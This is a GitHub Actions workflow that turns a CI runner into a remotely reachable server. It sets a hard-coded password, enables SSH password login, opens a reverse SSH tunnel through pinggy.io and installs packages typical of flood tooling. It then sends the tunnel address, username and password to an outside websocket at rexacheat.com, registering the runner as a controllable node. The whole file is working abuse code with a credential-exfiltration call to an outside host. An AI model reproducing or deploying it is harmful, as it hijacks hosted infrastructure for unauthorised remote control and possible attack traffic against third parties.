name: Ubuntu SSH Pinggy - 20 Paralel Job FULL

on:
  workflow_dispatch:

jobs:

  pinggy-1:
    runs-on: ubuntu-latest
    timeout-minutes: 100000
    steps:
      - uses: actions/checkout@v4
      - name: FULL SETUP
        run: |
          echo 'runner:Venom123!' | sudo chpasswd
          sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
          sudo systemctl restart ssh
          sudo apt update -y
          sudo apt install -y curl wget python3 python3-pip
          curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.0/install.sh | bash
          export NVM_DIR="$HOME/.nvm"
          [ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"
          nvm install 20.19.5
          nvm use 20.19.5
          npm install -g pm2
          npm init -y
          npm install gradient-string colors axios node-bash-title user-agents hpack socks randomstring sockopt
          pkill -f "tcp@a.pinggy.io" || true
          ssh -o StrictHostKeyChecking=no -p 443 -R0:localhost:22 tcp@a.pinggy.io > pinggy.log 2>&1 &
          sleep 15
          LINK=$(grep -oE 'tcp://[0-9a-zA-Z\.\-]+:[0-9]+' pinggy.log | head -n1)
          CLEAN=$(echo $LINK | sed 's/tcp:\/\///')
          python3 -m pip install websockets --break-system-packages || pip install websockets --break-system-packages
          python3 - <<EOF
          import asyncio, websockets, json
          async def s():
              try:
                  async with websockets.connect('wss://rexacheat.com/ws') as ws:
                      await ws.send(json.dumps({'type':'register','role':'vds_register','ssh_info':'SSH: $CLEAN\nUser: runner\nPass: Venom123!'}))
              except: pass
          asyncio.run(s())
          EOF
          sleep 3000
